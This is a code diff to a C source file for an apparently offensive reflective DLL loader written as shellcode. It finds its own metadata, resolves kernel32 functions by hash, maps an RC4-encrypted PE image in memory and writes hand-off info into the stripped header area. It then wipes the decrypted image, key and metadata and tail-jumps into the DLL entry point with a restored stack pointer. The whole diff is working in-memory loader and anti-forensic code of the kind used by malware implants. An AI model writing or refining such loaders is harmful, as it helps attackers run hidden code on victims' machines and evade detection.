@@ -26,8 +26,11 @@
 /* Provided by get_rip.asm: the address just after the call, inside this code. */
 extern PBYTE rfdll_get_rip(void);
 
-/* Provided by tail_jump.asm: enters the image entry point and never returns. */
-extern void rfdll_tail_jump(void* image_base, void* lp_reserved, void* entry);
+/* Provided by get_rip.asm: the caller's stack pointer, for measuring the frame. */
+extern PBYTE rfdll_get_rsp(void);
+
+/* Provided by tail_jump.asm: enters the image entry point and never returns.
+   The declaration lives in payload.h, which is included above. */
 
 /*
  * First page boundary at or after "address". The metadata sits on a page
@@ -69,17 +72,20 @@ static PRFDLL_META rfdll_exec_find_meta(PBYTE start, PBYTE* region_base, PBYTE* 
 	if (virtual_query != NULL)
 	{
 		/*
-		 * Query the region that holds the code, not the one after it: the
-		 * payload was handed to us as one allocation, so its own start is what
-		 * the wipe needs, and its end bounds the scan. Keeping the region end a
-		 * 64 bit address matters, the payload is easily above 4 GB.
+		 * Ask about the page the code itself sits on. VirtualQuery then reports
+		 * the allocation that page belongs to, and AllocationBase is what
+		 * VirtualFree needs; BaseAddress would be the base of the region the
+		 * queried page falls in, which is not necessarily the same thing.
+		 *
+		 * The address must be inside the payload: subtracting a page from the
+		 * first page boundary would step outside it whenever "start" is already
+		 * page aligned, which is why the code's own page is queried instead.
 		 */
-		if (virtual_query((LPCVOID)((PBYTE)rfdll_exec_next_page(start) - RFDLL_PAGE_SIZE),
-			&memory_info, sizeof(memory_info)) == sizeof(memory_info))
+		if (virtual_query((LPCVOID)start, &memory_info, sizeof(memory_info)) == sizeof(memory_info))
 		{
 			PBYTE region_end = (PBYTE)memory_info.BaseAddress + memory_info.RegionSize;
 
-			*region_base = (PBYTE)memory_info.BaseAddress;
+			*region_base = (PBYTE)memory_info.AllocationBase;
 			*region_limit = region_end;
 
 			if (region_end > cursor && region_end < end)
@@ -208,36 +214,46 @@ static PBYTE rfdll_exec_copy_image(PRFDLL_PAYLOAD payload, fnVirtualAlloc virtua
 }
 
 /*
- * Write the payload info into the mapped image at the fixed offset the DLL
- * knows about.
+ * Hook called by rfdll_prepare_image before the page protections are applied.
  *
- * Only possible when the packer stripped the headers: the offset lives in the
- * DOS stub area, which stripping wipes. A payload that kept its headers would
- * have the stub bytes still there, so writing over them could corrupt a PE that
- * the CRT or ntdll might still read, and the DLL would read a structure that
- * was never written. The caller checks the flag before calling this.
+ * The payload info goes at a fixed offset inside the image header area, and the
+ * header page is made read-only right after this hook returns, so this is the
+ * only window in which the write can happen. The context is the structure to
+ * copy in.
  */
-static void rfdll_exec_write_info(PBYTE image_base, PBYTE payload_base, SIZE_T payload_size,
-	DWORD image_size, DWORD host_hash)
+static void rfdll_exec_info_hook(PBYTE image_base, DWORD image_size, PVOID context)
 {
-	PRFDLL_PAYLOAD_INFO info = NULL;
+	RFDLL_PAYLOAD_INFO* source = (RFDLL_PAYLOAD_INFO*)context;
+	PRFDLL_PAYLOAD_INFO destination = NULL;
 
-	if (image_base == NULL)
+	if (image_base == NULL || source == NULL)
 		return;
 
-	info = (PRFDLL_PAYLOAD_INFO)(image_base + RFDLL_PAYLOAD_INFO_OFFSET);
+	source->image_base = image_base;
+	source->image_size = image_size;
 
-	info->magic = RFDLL_PAYLOAD_INFO_MAGIC;
-	info->version = RFDLL_PAYLOAD_INFO_VERSION;
-	info->payload_base = payload_base;
-	info->payload_size = payload_size;
-	info->image_base = image_base;
-	info->image_size = image_size;
-	info->host_hash = host_hash;
-	info->flags = 0;
+	/*
+	 * The fixed offset lives inside the DOS stub area, which only exists as
+	 * scratch space when the packer stripped the headers. Refuse to write over
+	 * a real header instead of corrupting an image that still has one.
+	 */
+	if (image_size <= RFDLL_PAYLOAD_INFO_OFFSET + RFDLL_PAYLOAD_INFO_SIZE)
+		return;
+
+	destination = (PRFDLL_PAYLOAD_INFO)(image_base + RFDLL_PAYLOAD_INFO_OFFSET);
+
+	/* Field by field: no CRT memcpy in the shellcode. */
+	destination->magic = source->magic;
+	destination->version = source->version;
+	destination->payload_base = source->payload_base;
+	destination->payload_size = source->payload_size;
+	destination->image_base = source->image_base;
+	destination->image_size = source->image_size;
+	destination->host_hash = source->host_hash;
+	destination->flags = source->flags;
 }
 
-void entrypoint_exec(void)
+void rfdll_exec_run(PBYTE caller_stack)
 {
 	PBYTE self = NULL;
 	PBYTE region_base = NULL;
@@ -253,17 +269,21 @@ void entrypoint_exec(void)
 	fnVirtualAlloc virtual_alloc = NULL;
 	fnVirtualFree virtual_free = NULL;
 	SIZE_T payload_size = 0;
+	RFDLL_PAYLOAD_INFO info;
 
 	self = rfdll_get_rip();
 	if (self == NULL)
 		return;
 
+
 	meta = rfdll_exec_find_meta(self, &region_base, &region_limit);
 	if (meta == NULL)
 		return;
 
+
 	if (!rfdll_exec_open_payload(meta, &payload, region_limit))
 		return;
+
 
 	/* Resolve what the copy and the wipe need before anything is changed. */
 	kernel32 = GMHR_Hash(HASH_KERNEL32);
@@ -274,53 +294,95 @@ void entrypoint_exec(void)
 	if (virtual_alloc == NULL || virtual_free == NULL)
 		return;
 
+
 	/*
 	 * Map from a copy, so that the wipe below can destroy the payload without
-	 * destroying the PE being mapped.
-	 */
-	copy = rfdll_exec_copy_image(&payload, virtual_alloc);
-	if (copy == NULL)
-		return;
-
-	image_base = rfdll_prepare_image(copy, payload.image_size, &entry_rva,
-		&image_size, &needs_delete_table);
-
-	/* The copy has served its purpose either way. */
-	virtual_free(copy, 0, MEM_RELEASE);
-
-	if (image_base == NULL || entry_rva == 0)
-		return;
-
-	/*
-	 * The info has to be written before the wipe, because it is built from the
-	 * metadata that the wipe is about to remove.
-	 *
-	 * It is stored inside the mapped image, not on this frame: the tail jump
-	 * abandons the frame, so a pointer to a local would dangle the moment the
-	 * image entry point started running.
+	 * destroying the PE being mapped. The info structure is filled in first and
+	 * handed to the hook, which writes it into the image before the page
+	 * protections are applied (the header page is read-only afterwards, so
+	 * there is no later chance to write there).
 	 */
 	payload_size = 0;
 	if (region_base != NULL && region_limit != NULL && region_limit > region_base)
 		payload_size = (SIZE_T)(region_limit - region_base);
 
-	rfdll_exec_write_info(image_base, region_base, payload_size, image_size,
-		payload.host_hash);
+	info.magic = RFDLL_PAYLOAD_INFO_MAGIC;
+	info.version = RFDLL_PAYLOAD_INFO_VERSION;
+	info.payload_base = region_base;
+	info.payload_size = payload_size;
+	info.image_base = NULL;		/* filled in by the hook, once the base is known */
+	info.image_size = 0;
+	info.host_hash = payload.host_hash;
 
 	/*
-	 * Wipe the whole payload region: the decrypted image, the RC4 key and the
-	 * metadata all live there. The image copy written just above is unaffected,
-	 * because it lives in the mapped image rather than in the payload.
+	 * This entry point wipes the payload and cannot free it, because it is
+	 * still running from that region when it leaves, so the payload is asked
+	 * to release it.
 	 */
-	if (region_base != NULL && payload_size != 0)
+	info.flags = RFDLL_PAYLOAD_FLAG_FREE_BY_DLL;
+
+	copy = rfdll_exec_copy_image(&payload, virtual_alloc);
+	if (copy == NULL)
+		return;
+
+
+	image_base = rfdll_prepare_image(copy, payload.image_size, &entry_rva,
+		&image_size, &needs_delete_table, rfdll_exec_info_hook, &info);
+
+
+
+	/* The copy has served its purpose either way. */
+	if (copy != NULL)
+		virtual_free(copy, 0, MEM_RELEASE);
+	copy = NULL;
+
+	if (image_base == NULL || entry_rva == 0)
+		return;
+
+	/*
+	 * Wipe what has to disappear: the decrypted PE image, the RC4 key and the
+	 * metadata that sits between them. The loader code itself is deliberately
+	 * left alone, because this function is still executing from it and zeroing
+	 * it would pull the ground out from under the jump below.
+	 *
+	 * The image was mapped from a private copy, so destroying these bytes does
+	 * not affect the running image.
+	 */
 	{
-		rfdll_exec_wipe(region_base, payload_size);
+		PBYTE secret_start = (PBYTE)payload.meta;
+		SIZE_T secret_size = (SIZE_T)((payload.image + payload.image_size) - secret_start);
+
+
+		/* Sanity: never wipe the code, whatever the metadata claims. */
+		if (secret_start > self && secret_size != 0 &&
+			(payload.image + payload.image_size) > secret_start)
+		{
+			rfdll_exec_wipe(secret_start, secret_size);
+		}
 	}
 
 	/*
 	 * Leave for good. lpReserved points at the copy inside the mapped image,
-	 * which the DLL can free along with the payload; nothing handed to the DLL
-	 * lives in this abandoned frame.
+	 * which the payload can free along with the region; nothing handed to the
+	 * payload lives in this abandoned frame.
+	 *
+	 * The stack pointer captured on entry is restored, not a guessed frame
+	 * size: that puts RSP exactly where the payload's caller left it, so the
+	 * image entry point starts at a normal function entry and returns into the
+	 * caller. An earlier attempt assumed a fixed 0x78 byte frame while the
+	 * compiler used 0x118, which left RSP misaligned and faulted inside ntdll.
+	 */
+
+
+	/*
+	 * caller_stack is the stack pointer the payload's caller had at its call,
+	 * captured in entrypoint_exec before any frame existed. Restoring it makes
+	 * the image entry point run exactly where entrypoint_exec would have: the
+	 * DLL's frame goes below it and its ret consumes the caller's return
+	 * address, so control returns to whoever called the payload while nothing
+	 * in the payload is left on the stack.
 	 */
 	rfdll_tail_jump(image_base, (PVOID)(image_base + RFDLL_PAYLOAD_INFO_OFFSET),
-		image_base + entry_rva);
+		image_base + entry_rva, caller_stack);
+	kernel32 = NULL;
 }
